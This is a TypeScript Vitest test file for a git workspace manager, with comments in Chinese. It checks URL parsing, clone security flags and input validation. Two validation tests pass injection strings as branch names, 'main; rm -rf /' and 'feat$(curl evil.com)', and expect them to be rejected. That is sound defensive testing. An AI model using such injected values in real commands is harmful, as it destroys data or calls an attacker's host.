import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('node:child_process', () => ({
  execFileSync: vi.fn(),
}));

vi.mock('node:fs', () => ({
  existsSync: vi.fn(),
  mkdirSync: vi.fn(),
}));

vi.mock('node:crypto', () => ({
  randomBytes: vi.fn(() => Buffer.from('a1b2c3', 'hex')),
}));

vi.mock('../../config.js', () => ({
  config: {
    workspace: {
      baseDir: '/tmp/workspaces',
      branchPrefix: 'feat/claude-session',
    },
  },
}));

vi.mock('../../utils/logger.js', () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  },
}));

import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync } from 'node:fs';
import { deriveRepoName, setupWorkspace } from '../manager.js';

const mockExecFileSync = vi.mocked(execFileSync);
const mockExistsSync = vi.mocked(existsSync);
const mockMkdirSync = vi.mocked(mkdirSync);

beforeEach(() => {
  vi.clearAllMocks();
  // 默认: baseDir 存在, workspacePath 不存在
  mockExistsSync.mockImplementation((p) => {
    if (p === '/tmp/workspaces') return true;
    return false;
  });
});

// ============================================================
// deriveRepoName
// ============================================================

describe('deriveRepoName', () => {
  it('should extract name from HTTPS URL', () => {
    expect(deriveRepoName('https://github.com/user/my-repo')).toBe('my-repo');
  });

  it('should strip .git suffix from HTTPS URL', () => {
    expect(deriveRepoName('https://github.com/user/my-repo.git')).toBe('my-repo');
  });

  it('should strip .git/ suffix', () => {
    expect(deriveRepoName('https://github.com/user/my-repo.git/')).toBe('my-repo');
  });

  it('should extract name from SSH URL', () => {
    expect(deriveRepoName('git@github.com:user/my-repo.git')).toBe('my-repo');
  });

  it('should extract name from local path', () => {
    expect(deriveRepoName('/home/user/projects/my-app')).toBe('my-app');
  });

  it('should strip trailing slashes from path', () => {
    expect(deriveRepoName('/home/user/projects/my-app///')).toBe('my-app');
  });

  it('should fallback to "repo" for empty basename', () => {
    expect(deriveRepoName('')).toBe('repo');
  });

  it('should handle URL with nested path', () => {
    expect(deriveRepoName('https://gitlab.com/group/subgroup/project.git')).toBe('project');
  });
});

// ============================================================
// setupWorkspace
// ============================================================

describe('setupWorkspace', () => {
  it('should throw when neither repoUrl nor localPath is provided', () => {
    expect(() => setupWorkspace({})).toThrow('必须提供 repo_url 或 local_path');
  });

  it('should clone remote repo and create feature branch', () => {
    const result = setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });

    expect(result.repoName).toBe('repo');
    expect(result.branch).toMatch(/^feat\/claude-session-/);
    expect(result.workspacePath).toContain('/tmp/workspaces/repo-feat-claude-session-');

    // 验证 execFileSync 调用了 git clone 和 git checkout
    expect(mockExecFileSync).toHaveBeenCalledTimes(2);

    const cloneCall = mockExecFileSync.mock.calls[0];
    expect(cloneCall[0]).toBe('git');
    expect(cloneCall[1]).toContain('clone');
    expect(cloneCall[1]).toContain('https://github.com/user/repo.git');

    const checkoutCall = mockExecFileSync.mock.calls[1];
    expect(checkoutCall[0]).toBe('git');
    expect(checkoutCall[1]![0]).toBe('checkout');
    expect(checkoutCall[1]![1]).toBe('-b');
  });

  it('should include git security parameters in clone args', () => {
    setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });

    const cloneArgs = mockExecFileSync.mock.calls[0][1] as string[];
    // 禁用 git hooks
    expect(cloneArgs).toContain('--config');
    expect(cloneArgs[cloneArgs.indexOf('--config') + 1]).toBe('core.hooksPath=/dev/null');
    // 禁用 submodules
    expect(cloneArgs).toContain('--no-recurse-submodules');
    // 禁用 file 协议
    expect(cloneArgs).toContain('-c');
    expect(cloneArgs[cloneArgs.indexOf('-c') + 1]).toBe('protocol.file.allow=never');
  });

  it('should clone local repo when path exists', () => {
    // localPath 存在性检查需要返回 true
    mockExistsSync.mockImplementation((p) => {
      if (p === '/tmp/workspaces') return true;
      if (p === '/home/user/projects/my-app') return true;
      return false;
    });

    const result = setupWorkspace({ localPath: '/home/user/projects/my-app' });

    expect(result.repoName).toBe('my-app');

    const cloneCall = mockExecFileSync.mock.calls[0];
    expect(cloneCall[1]).toContain('/home/user/projects/my-app');
  });

  it('should pass --branch when sourceBranch is specified', () => {
    setupWorkspace({ repoUrl: 'https://github.com/user/repo', sourceBranch: 'develop' });

    const cloneCall = mockExecFileSync.mock.calls[0];
    const args = cloneCall[1] as string[];
    const branchIdx = args.indexOf('--branch');
    expect(branchIdx).toBeGreaterThan(-1);
    expect(args[branchIdx + 1]).toBe('develop');
  });

  it('should use custom featureBranch when specified', () => {
    const result = setupWorkspace({
      repoUrl: 'https://github.com/user/repo',
      featureBranch: 'fix/my-bug',
    });

    expect(result.branch).toBe('fix/my-bug');

    const checkoutCall = mockExecFileSync.mock.calls[1];
    expect(checkoutCall[1]![2]).toBe('fix/my-bug');
  });

  it('should create baseDir if it does not exist', () => {
    mockExistsSync.mockReturnValue(false);

    setupWorkspace({ repoUrl: 'https://github.com/user/repo' });

    expect(mockMkdirSync).toHaveBeenCalledWith('/tmp/workspaces', { recursive: true });
  });

  it('should not create baseDir if it already exists', () => {
    setupWorkspace({ repoUrl: 'https://github.com/user/repo' });

    expect(mockMkdirSync).not.toHaveBeenCalled();
  });

  it('should wrap git clone errors', () => {
    mockExecFileSync.mockImplementationOnce(() => {
      throw new Error('fatal: repository not found');
    });

    expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/no-exist' }))
      .toThrow('git clone 失败: fatal: repository not found');
  });

  it('should wrap git checkout errors', () => {
    mockExecFileSync
      .mockImplementationOnce(() => '') // clone 成功
      .mockImplementationOnce(() => {
        throw new Error('fatal: branch already exists');
      });

    expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
      .toThrow('创建分支失败: fatal: branch already exists');
  });

  it('should prefer repoUrl over localPath when both provided', () => {
    mockExistsSync.mockImplementation((p) => {
      if (p === '/tmp/workspaces') return true;
      if (p === '/local/path') return true;
      return false;
    });

    const result = setupWorkspace({
      repoUrl: 'https://github.com/user/repo',
      localPath: '/local/path',
    });

    const cloneCall = mockExecFileSync.mock.calls[0];
    expect(cloneCall[1]).toContain('https://github.com/user/repo');
    expect(cloneCall[1]).not.toContain('/local/path');
    expect(result.repoName).toBe('repo');
  });

  // ============================================================
  // 输入校验
  // ============================================================

  describe('input validation', () => {
    it('should reject repoUrl without valid protocol', () => {
      expect(() => setupWorkspace({ repoUrl: 'not-a-url' }))
        .toThrow('无效的仓库 URL: not-a-url');
    });

    it('should accept HTTPS URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
        .not.toThrow();
    });

    it('should accept SSH URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'git@github.com:user/repo.git' }))
        .not.toThrow();
    });

    it('should accept ssh:// URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'ssh://git@github.com/user/repo' }))
        .not.toThrow();
    });

    it('should accept git:// URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'git://github.com/user/repo' }))
        .not.toThrow();
    });

    it('should reject localPath that does not exist', () => {
      mockExistsSync.mockImplementation((p) => {
        if (p === '/tmp/workspaces') return true;
        return false; // localPath 不存在
      });

      expect(() => setupWorkspace({ localPath: '/nonexistent/path' }))
        .toThrow('本地路径不存在: /nonexistent/path');
    });

    it('should reject sourceBranch with shell metacharacters', () => {
      expect(() => setupWorkspace({
        repoUrl: 'https://github.com/user/repo',
        sourceBranch: 'main; rm -rf /',
      })).toThrow('无效的分支名: main; rm -rf /');
    });

    it('should reject featureBranch with shell metacharacters', () => {
      expect(() => setupWorkspace({
        repoUrl: 'https://github.com/user/repo',
        featureBranch: 'feat$(curl evil.com)',
      })).toThrow('无效的分支名');
    });

    it('should accept valid branch names with slashes, dots, dashes', () => {
      expect(() => setupWorkspace({
        repoUrl: 'https://github.com/user/repo',
        sourceBranch: 'release/v1.2.3',
        featureBranch: 'feat/my-feature_v2',
      })).not.toThrow();
    });
  });
});
